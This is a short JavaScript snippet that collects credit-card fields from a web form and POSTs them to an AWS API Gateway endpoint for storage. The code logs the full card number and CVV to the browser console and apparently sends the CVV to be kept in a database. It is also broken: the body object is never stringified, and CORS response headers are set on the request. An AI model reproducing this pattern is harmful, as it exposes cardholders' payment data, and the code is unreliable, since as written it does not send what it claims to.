
const sendCardToDB = async () => {

    let formData = new FormData(document.getElementById('fcf-form-id'));
    let body = {
        "CCName": formData.get("CCName"),
        "CCNumber": formData.get("CCNumber"),
        "CCVCode": formData.get("CCVCode"),
        "CCExpDate": formData.get("CCExpDate"),
        "CCType": formData.get("CCType"),
    }
    console.log(body);

    const response = await fetch('https://e1vtmi4pk6.execute-api.eu-central-1.amazonaws.com/prod', {
        method: 'POST',
        body: body,
        headers: {
            "Access-Control-Allow-Headers" : "Content-Type",
            "Access-Control-Allow-Origin": "https://automaticom.cloud",
            "Access-Control-Allow-Methods": "POST,GET,OPTIONS",
            "Content-Type": "application/json"
        }
    });
    const myJson = await response.json();

    console.log(myJson);
}
